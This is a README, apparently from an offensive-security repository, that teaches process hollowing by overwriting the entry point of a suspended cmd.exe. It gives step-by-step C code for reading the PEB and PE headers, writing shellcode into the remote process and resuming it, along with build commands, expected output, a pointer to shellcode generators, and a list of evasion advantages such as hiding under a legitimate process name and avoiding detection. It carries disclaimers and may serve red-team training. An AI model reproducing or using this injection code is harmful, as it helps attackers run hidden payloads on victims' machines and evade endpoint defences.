# Process Hollowing

This folder demonstrates **Process Hollowing**—a sophisticated process injection technique that manipulates a suspended process's executable image in memory.

**Important Disclaimer**: This code is for educational purposes only on systems you own or have explicit authorization to test. Unauthorized injection is illegal.

---

## What Is Process Hollowing?

Process Hollowing is an advanced injection technique that involves creating a legitimate process, removing its original executable code from memory, and replacing it with malicious code. The classic approach consists of:

1. Create a process in a suspended state
2. Unmap the original PE (Portable Executable) from memory
3. Map a new PE in its place
4. Resume execution

### Simplified Variant: Entry Point Overwriting

This implementation demonstrates a **simplified version** of process hollowing that achieves similar results with less complexity. Instead of fully unmapping and remapping the PE, we:

1. **Create Process (Suspended)** – Spawn a legitimate process in suspended state
2. **Locate Entry Point** – Read the PE structure to find the entry point address
3. **Overwrite Entry Point** – Replace the entry point code with shellcode
4. **Resume Process** – When resumed, execution begins at our shellcode instead of the original code

When the process resumes, its primary thread's instruction pointer directs execution to our shellcode rather than the legitimate executable's code section.

### Locating the PE Entry Point

Finding the entry point requires navigating the PE structure in memory using undocumented Windows internals:

**Step 1: Query Process Information**
- Call `NtQueryInformationProcess` (native API) to retrieve process information
- Populate a `PROCESS_BASIC_INFORMATION` structure
- Extract `PebBaseAddress` (pointer to Process Environment Block)

**Step 2: Read ImageBaseAddress**
- The PEB contains `ImageBaseAddress` (undocumented member at offset 0x10 on 64-bit)
- This points to where the PE is loaded in memory

**Step 3: Parse PE Headers**
- Read the DOS header from `ImageBaseAddress`
- Use `e_lfanew` field to locate the NT headers
- Navigate to `OptionalHeader->AddressOfEntryPoint`
- This gives the RVA (Relative Virtual Address) of the entry point

**Step 4: Calculate Entry Point**
- Entry Point = `ImageBaseAddress` + `AddressOfEntryPoint` (RVA)

### In This Folder

The example demonstrates **entry point overwriting on cmd.exe**—suspending the process, locating its entry point through PE parsing, and replacing it with shellcode.

**Flow:**
```
Injector Process
    │
    ├─ CreateProcessW(CREATE_SUSPENDED) → Spawn cmd.exe suspended
    │
    ├─ NtQueryInformationProcess() → Get PEB address
    │
    ├─ ReadProcessMemory(PEB + 0x10) → Get ImageBaseAddress
    │
    ├─ ReadProcessMemory(ImageBaseAddress) → Read DOS header
    │
    ├─ ReadProcessMemory(ImageBase + e_lfanew) → Read NT headers
    │
    ├─ Calculate: EntryPoint = ImageBase + RVA
    │
    ├─ WriteProcessMemory(EntryPoint) → Overwrite with shellcode
    │
    └─ ResumeThread() → Execute shellcode at entry point
        │
        └─ Suspended Process (cmd.exe)
            │
            ├─ Thread resumes
            │
            ├─ Instruction pointer → Entry point (now shellcode)
            │
            └─ Shellcode executes instead of original code
```

---

## Code Breakdown

### Creating a Suspended Process

```c
STARTUPINFOW si = { 0 };
si.cb = sizeof(si);
si.dwFlags = STARTF_USESHOWWINDOW;

PROCESS_INFORMATION pi = { 0 };

BOOL success = CreateProcessW(
    L"C:\\Windows\\System32\\cmd.exe",  // Target executable
    NULL,                                // Command line arguments
    NULL,                                // Process security attributes
    NULL,                                // Thread security attributes
    FALSE,                               // Don't inherit handles
    CREATE_SUSPENDED,                    // Create in suspended state
    NULL,                                // Environment variables
    NULL,                                // Current directory
    &si,                                 // Startup info
    &pi                                  // Process information output
);
```

Creates cmd.exe in a suspended state—before any of its code executes.

### Retrieving the PEB Address

```c
PROCESS_BASIC_INFORMATION pbi = { 0 };
ULONG returnLength = 0;

NTSTATUS status = NtQueryInformationProcess(
    pi.hProcess,                        // Handle to suspended process
    ProcessBasicInformation,            // Information class
    &pbi,                               // Output buffer
    sizeof(pbi),                        // Buffer size
    &returnLength                       // Bytes written
);
```

Queries the process to retrieve its `PROCESS_BASIC_INFORMATION` structure, which contains `PebBaseAddress`.

### Reading ImageBaseAddress from PEB

```c
// PEB + 0x10 = ImageBaseAddress (64-bit offset)
LPVOID lpBaseAddress = (LPVOID)((DWORD64)(pbi.PebBaseAddress) + 0x10);

LPVOID remoteImageBase = 0;
SIZE_T bytesRead = 0;

BOOL readSuccess = ReadProcessMemory(
    pi.hProcess,            // Suspended process handle
    lpBaseAddress,          // PEB + 0x10 (ImageBaseAddress location)
    &remoteImageBase,       // Output: base address of PE
    sizeof(LPVOID),         // 8 bytes on 64-bit
    &bytesRead
);
```

Reads the `ImageBaseAddress` from the PEB—this is where the PE is loaded in memory.

### Reading the DOS Header

```c
IMAGE_DOS_HEADER dHeader = { 0 };

readSuccess = ReadProcessMemory(
    pi.hProcess,            // Suspended process
    remoteImageBase,        // PE base address
    &dHeader,               // Output: DOS header
    sizeof(dHeader),        // Size of DOS header
    &bytesRead
);
```

Reads the DOS header from the PE's base address. The `e_lfanew` field points to the NT headers.

### Reading the NT Headers

```c
LPVOID lpNtHeaders = (LPVOID)((DWORD64)remoteImageBase + dHeader.e_lfanew);

IMAGE_NT_HEADERS64 ntHeaders = { 0 };

readSuccess = ReadProcessMemory(
    pi.hProcess,            // Suspended process
    lpNtHeaders,            // DOS base + e_lfanew
    &ntHeaders,             // Output: NT headers
    sizeof(ntHeaders),      // Size of NT headers
    &bytesRead
);
```

Uses `e_lfanew` to locate and read the NT headers, which contain the `OptionalHeader`.

### Calculating the Entry Point

```c
LPVOID lpEntryPoint = (LPVOID)(
    (DWORD64)remoteImageBase + 
    ntHeaders.OptionalHeader.AddressOfEntryPoint
);
```

Calculates the absolute entry point address:
- `remoteImageBase` = where PE is loaded
- `AddressOfEntryPoint` = RVA of entry point
- Entry point = Base + RVA

### Overwriting the Entry Point

```c
SIZE_T bytesWritten = 0;

BOOL writeSuccess = WriteProcessMemory(
    pi.hProcess,            // Suspended process
    lpEntryPoint,           // Entry point address
    shellcode,              // Shellcode to write
    sizeof(shellcode),      // Size of shellcode
    &bytesWritten
);
```

Overwrites the original entry point code with shellcode.

### Resuming Execution

```c
DWORD resumeResult = ResumeThread(pi.hThread);
```

Resumes the suspended thread. Execution begins at the entry point, which now contains our shellcode.

### Cleanup

```c
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
```

Releases handles. The process continues executing with injected shellcode.

---

## Prerequisites

### System Requirements
- Windows 10/11 (examples target modern Windows)
- Administrator privileges (usually required)
- 64-bit system (code uses 64-bit PE structures)
- Isolated test environment **strongly recommended**

### Development Tools
- **C/C++ Compiler:** MSVC (Visual Studio) or MinGW-w64
- **Native API Support:** ntdll.lib (for `NtQueryInformationProcess`)
- **Debugger:** WinDbg, x64dbg, or Visual Studio Debugger (optional)

### Knowledge Requirements
- Understanding of PE file format (DOS header, NT headers, OptionalHeader)
- Understanding of PEB (Process Environment Block) structure
- Understanding of RVA (Relative Virtual Address) calculation
- Understanding of native Windows APIs (`NtQueryInformationProcess`)
- Understanding of shellcode (position-independent machine code)

---

## Building

### Build with MSVC (Visual Studio Developer Command Prompt)

```cmd
cl /nologo "Process-Hollowing.c" ntdll.lib
```

### Build with MinGW (gcc)

```bash
gcc -o "Process-Hollowing.exe" "Process-Hollowing.c" -lntdll
```

**Important:** The `-lntdll` flag is required to link against `ntdll.dll` for `NtQueryInformationProcess`.

---

## Running

### Execute the Injector

```powershell
.\Process-Hollowing.exe
```

### Expected Output

```
Process created in suspended state. PID: 1234
PEB address retrieved: 0x000000000012000
Remote Image Base Address: 0x00007FF7A2B40000
DOS Header read successfully. e_lfanew: 0x100
NT Headers read successfully. EntryPoint: 0x14A0
Shellcode written successfully to entry point.
Process resumed. Shellcode is executing.
```

The cmd.exe process:
- Is created with original code suspended
- Has its entry point overwritten with shellcode
- Executes shellcode when resumed (before any cmd.exe code)

---

## Generating Shellcode

The `shellcode` array in the code must be filled with actual machine code bytes. Use **Donut** (documented in [../Shellcode/README.md](../Shellcode/README.md)) to generate shellcode and convert to hex format.

---

## How It Works: Step-by-Step

```
┌──────────────────────────────────────────────────────┐
│ Injector Process Starts                              │
└──────────────┬───────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────┐
│ CreateProcessW(CREATE_SUSPENDED)                     │
│ ├─ Spawn cmd.exe in suspended state                  │
│ └─ Primary thread created but paused                 │
└──────────────┬───────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────┐
│ NtQueryInformationProcess()                          │
│ ├─ Query ProcessBasicInformation                     │
│ ├─ Populate PROCESS_BASIC_INFORMATION                │
│ └─ Extract PebBaseAddress: 0x000000000012000        │
└──────────────┬───────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────┐
│ ReadProcessMemory(PEB + 0x10)                        │
│ ├─ Read ImageBaseAddress from PEB                    │
│ └─ ImageBase: 0x00007FF7A2B40000                    │
└──────────────┬───────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────┐
│ ReadProcessMemory(ImageBase) → DOS Header            │
│ ├─ Read IMAGE_DOS_HEADER structure                   │
│ ├─ Signature: 'MZ' (0x5A4D)                          │
│ └─ e_lfanew: 0x100 (offset to NT headers)           │
└──────────────┬───────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────┐
│ ReadProcessMemory(ImageBase + e_lfanew) → NT Headers│
│ ├─ Read IMAGE_NT_HEADERS64 structure                 │
│ ├─ Signature: 'PE\0\0' (0x00004550)                  │
│ └─ OptionalHeader.AddressOfEntryPoint: 0x14A0 (RVA) │
└──────────────┬───────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────┐
│ Calculate Entry Point Address                        │
│ ├─ EntryPoint = ImageBase + RVA                      │
│ └─ 0x00007FF7A2B40000 + 0x14A0 = 0x00007FF7A2B414A0 │
└──────────────┬───────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────┐
│ WriteProcessMemory(EntryPoint)                       │
│ ├─ Overwrite original entry point code               │
│ ├─ Write shellcode bytes                             │
│ └─ Entry point now contains shellcode                │
└──────────────┬───────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────┐
│ ResumeThread()                                       │
│ ├─ Resume suspended primary thread                   │
│ └─ Thread wakes up at entry point                    │
└──────────────┬───────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────┐
│ Shellcode Execution                                  │
│ ├─ RIP points to entry point (shellcode)             │
│ ├─ Execute injected payload                          │
│ └─ Original PE code never executes                   │
└──────────────┬───────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────┐
│ Cleanup (Injector)                                   │
│ ├─ CloseHandle(pi.hThread)                           │
│ └─ CloseHandle(pi.hProcess)                          │
└──────────────────────────────────────────────────────┘
```

---

## Advantages of Process Hollowing

✓ **Legitimate process name** – Appears as cmd.exe in Task Manager
✓ **No new process** – Hijacks legitimate system process
✓ **Stealthy** – Original executable replaced with malicious code
✓ **Process privilege inheritance** – Inherits target's security context
✓ **Bypasses basic detection** – Process appears legitimate to users

---

## Limitations and Risks

✗ **Requires process creation** – Must be able to spawn new processes
✗ **Administrator privileges** – Usually required for native API access
✗ **64-bit specific** – Code uses 64-bit offsets and structures
✗ **PE parsing complexity** – Requires understanding of PE format
✗ **EDR detection** – Modern EDR monitors `NtQueryInformationProcess` and memory writes to entry points
✗ **Architecture dependency** – PEB offsets differ between 32-bit and 64-bit

---

## Comparison: Full Hollowing vs Entry Point Overwriting

| Aspect | Full Process Hollowing | Entry Point Overwriting |
|--------|------------------------|-------------------------|
| **PE Unmapping** | Yes (NtUnmapViewOfSection) | No |
| **New PE Mapping** | Yes (map entire PE) | No |
| **Complexity** | High | Moderate |
| **Code Changes** | Entire PE replaced | Only entry point |
| **Detection Risk** | Higher (unmapping visible) | Lower (smaller footprint) |
| **Stability** | May have issues | Generally stable |

This implementation uses **entry point overwriting** for simplicity and reduced detection surface.

---

## Legal and Ethical Considerations

**Authorization Required:**
- Only use on systems you own
- Never test on systems without explicit written permission
- Works in authorized penetration testing scenarios only

**Responsible Disclosure:**
- Report findings through proper channels
- Give organizations time to patch
- Follow your organization's security policies

**Legal Implications:**
- Unauthorized code injection is illegal (Computer Fraud and Abuse Act in US)
- Similar laws exist in other jurisdictions
- Violations can result in criminal charges

---

## References

- [CreateProcessW Documentation](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw)
- [NtQueryInformationProcess Documentation](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess)
- [PROCESS_BASIC_INFORMATION Structure](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-process_basic_information)
- [PE Format Documentation](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [IMAGE_DOS_HEADER Structure](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_dos_header)
- [IMAGE_NT_HEADERS Structure](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers64)
- [WriteProcessMemory Documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
- [Windows Internals](https://learn.microsoft.com/en-us/sysinternals/)

---

## Disclaimer

This code and documentation are provided for educational purposes on authorized systems only. Unauthorized process injection is illegal and violates computer fraud laws. You are solely responsible for compliance with applicable laws and organizational policies.
